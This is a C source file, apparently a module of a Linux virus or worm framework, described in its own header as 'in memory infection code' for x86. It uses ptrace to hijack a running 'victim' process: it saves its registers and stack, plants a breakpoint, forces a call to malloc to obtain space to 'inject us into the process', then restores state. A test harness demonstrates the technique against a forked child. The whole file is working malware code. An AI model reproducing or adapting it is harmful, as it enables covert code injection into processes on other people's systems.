/* in memory infection code
 * for x86/linux and the broken ptrace interface only, so far.
 */

#include <sys/ptrace.h>
#include <sys/user.h>
#include "lookup-pm.h"
#include "wrconfig.h"
#include "common.c"
#include "wrutil.c"
#include "int80.h"


#define	PF_PTR_MAGIC	0x0039f307	/* unlikely to appear */

typedef struct {
	int	initial;	/* when PF_PTR_MAGIC, struct is initialized */

	int	pt_state;	/* the ptrace state of the process */
	int	pt_pid;		/* pid that is being ptraced */
} pf_ptrs;


/* local prototypes
 */
#define	ptrace(r,p,a,d) im_ptrace(r,p,(void *)a,(void *)d)
static long im_ptrace (long request, long pid, void *addr, void *data);
static unsigned int pf_ptrace (void *addr);


/* ptrace
 *
 * use non-inlined ptrace, because we cannot pass more than three parameters
 * with the syscall interface.
 */

static long
im_ptrace (long request, long pid, void *addr, void *data)
{
	long	ret;

	__asm__ __volatile__ (	"int	$0x80"
		: "=a" (ret)
		: "a" (__NR_ptrace), "b" (&request));

	return (ret);
}


static unsigned int
pf_ptrace (void *addr)
{
	pf_ptrs *	pfs;
	unsigned int	data;

	/* static initialization stuff
	 */
	STATICPTR ((void *) pfs, "12");

	if (((unsigned int) addr) == PF_PTR_MAGIC) {
		pfs->initial = PF_PTR_MAGIC;

		return (0);
	} else if (pfs->initial == PF_PTR_MAGIC) {
		memcpy ((unsigned char *) pfs, (unsigned char *) addr,
			sizeof (pf_ptrs));
		pfs->initial = 0;

		return (0);
	}

	/* we have a sane pfs pointer by now, so we can actually get work done
	 */
	data = ptrace (PTRACE_PEEKDATA, pfs->pt_pid, addr, NULL);

#ifdef	TESTING
	printf ("pt: 0x%08x = PEEKDATA (pid = %5d, addr = 0x%08x)\n",
		data, pfs->pt_pid, (unsigned int) addr);
#endif

	/* FIXME: use kernel syscall interface to pull errno, since it is the
	 *        only way we can tell, that ptrace failed.
	 */
	return (data);
}


int
inm_call (int pid, char *func, unsigned int *args, unsigned int args_count,
	unsigned int *retval)
{
	pf_ptrs		pfi;		/* initialization struct */
	void *		pf_ptrace_ptr;	/* local pointer to ptrace function */

	void *		dst_func_entry;
	int		n;
	int		failure = 1;

	/* ptrace low level variables
	 */
	struct user	pt_user,	/* original backup registers */
			pt_user_our;	/* temporarily used by us */
	unsigned int	addr;		/* working address */
	unsigned int	save_stack[8 + 1];	/* at max 8 arguments */
#define	OPC_MARKER	0xcccccccc
	unsigned int	save_opcode = OPC_MARKER;
					/* opcode at current %eip */
	int		status;		/* traced process status */


	if (args_count > ((sizeof (save_stack) / sizeof (save_stack[0])) - 1))
		return (1);

	pfi.initial = 0;
	pfi.pt_state = 0;	/* XXX: not yet used */
	pfi.pt_pid = pid;

	pf_ptrace ((void *) PF_PTR_MAGIC);
	pf_ptrace (&pfi);

	FUNCPTR (pf_ptrace_ptr, "pf_ptrace");

	/* try to resolve "malloc" symbol
	 * XXX: assume a standard linux ELF memory layout, start at 0x08048000
	 */
	dst_func_entry = symbol_resolve (pf_ptrace_ptr,
		(void *) 0x08048000, func);

	if (dst_func_entry == NULL)
		return (1);

	/* now that we have the address of malloc, lets get the space to
	 * inject us into the process
	 *
	 * order: 1. save anything we will modify later
	 *        2. build stack frame for malloc parameters and call malloc
	 *        3. restore everything we touched
	 */
	/* step 1: save registers and stack content */
	if (ptrace (PTRACE_GETREGS, pid, NULL, &pt_user) < 0)
		return (1);

	memcpy (&pt_user_our, &pt_user, sizeof (pt_user_our));

	addr = pt_user.regs.esp;
	for (n = 0 ; n < (sizeof (save_stack) / sizeof (save_stack[0])) ; ++n)
		save_stack[n] = ptrace (PTRACE_PEEKDATA, pid,
			addr + 4 * n, NULL);

	/* step 2: setup call frame on stack
	 * stack layout:
	 *
	 * pt_user.regs.esp -> top_val		not modified
	 *              + 4    parameter #last
	 *              + ...  parameter #1
	 * new esp ->   + ...  return address	set to magic
	 */
	for (addr = pt_user.regs.esp - sizeof (int), n = args_count - 1 ;
		n >= 0 ; --n, addr -= 4)
	{
		if (ptrace (PTRACE_POKEDATA, pid, addr, args[n]) < 0)
			goto bail;
	}

	/* now setup an "int3" trap at the current eip, and use this as
	 * return address. ptrace will poke into any kind of page protection,
	 * so this really should be no problem, even with -w pages.
	 *
	 * 1. put the retaddr on top of the stack
	 * 2. save the old opcodes from the current eip
	 * 3. overwrite the current instruction
	 */
	if (ptrace (PTRACE_POKEDATA, pid, addr, pt_user.regs.eip) < 0)
		goto bail;

	save_opcode = ptrace (PTRACE_PEEKDATA, pid, pt_user.regs.eip, NULL);
	if (ptrace (PTRACE_POKEDATA, pid, pt_user.regs.eip, 0xcccccccc) < 0)
		goto bail;


	/* step 2: call malloc, redirect eip
	 */
	pt_user_our.regs.esp = addr;
	pt_user_our.regs.eip = (unsigned int) dst_func_entry;
	if (ptrace (PTRACE_SETREGS, pid, NULL, &pt_user_our) < 0)
		goto bail;

#if 0
	/**** XXX: this is an alternative implementation using singlestepping.
	 * it is slower but does not have to modify the .text section of the
	 * running process.
	 */

	/* single step through malloc function, until we reach our magic
	 * return address (malloc return value is in %eax afterwards)
	 */
	do {
		if (ptrace (PTRACE_SINGLESTEP, pid, NULL, NULL) < 0)
			goto bail;

		wait (NULL);

		if (ptrace (PTRACE_GETREGS, pid, NULL, &pt_user_our) < 0)
			goto bail;
	} while (pt_user_our.regs.eip != PF_RETADDR_MAGIC);
#endif
	if (ptrace (PTRACE_CONT, pid, NULL, NULL) < 0)
		goto bail;

	waitpid (pid, &status, 0);	/* detrap */
	if (WIFEXITED (status))
		goto bail;

	/* save function return value for later use
	 */
	if (ptrace (PTRACE_GETREGS, pid, NULL, &pt_user_our) < 0)
		goto bail;
	*retval = (unsigned int) pt_user_our.regs.eax;

	failure = 0;

bail:	/* restore stack frame */
	for (n = 0 ; n < (sizeof (save_stack) / sizeof (save_stack[0])) ; ++n)
		ptrace (PTRACE_POKEDATA, pid, addr + 4 * n, save_stack[n]);

	/* restore registers */
	ptrace (PTRACE_SETREGS, pid, NULL, &pt_user);

	if (save_opcode != OPC_MARKER)
		ptrace (PTRACE_POKEDATA, pid, pt_user.regs.eip, save_opcode);

	return (failure);
}


#ifdef	TESTING

int
main (int argc, char *argv[])
{
	int		fpid;
	char *		eargv[2];
	char *		func;
	unsigned int	margs[1],
			mret;
	int		status;

	STRINGPTR (eargv[0], "/tmp/inmem-test");
	eargv[1] = NULL;

	fpid = fork ();
	if (fpid < 0)
		_exit (0);

	/* child */
	if (fpid == 0) {
		if (ptrace (PTRACE_TRACEME, 0, NULL, NULL) != 0)
			_exit (0);

		execve (eargv[0], eargv, NULL);
		write (2, "FAILURE!\n", 9);
		_exit (0);
	}

	wait (NULL);

	/* now start the show, then wait a bit and inject ourselves
	 */
	ptrace (PTRACE_CONT, fpid, NULL, NULL);

	sleep (1);
	kill (fpid, SIGSTOP);

	waitpid (fpid, &status, 0);
	printf ("status: 0x%08x\n", status);

	if (WIFEXITED (status)) {
		printf ("child exited, aborting\n");

		_exit (1);
	}

	STRINGPTR (func, "malloc");
	margs[0] = 0x1234;

	if (inm_call (fpid, func, margs, 1, &mret) != 0) {
		printf ("malloc in victim process failed\n");

		_exit (1);
	}

	printf ("malloc in process %d: 0x%08x\n", fpid, mret);
	ptrace (PTRACE_DETACH, fpid, NULL, NULL);

	printf ("exiting\n");
}

#endif


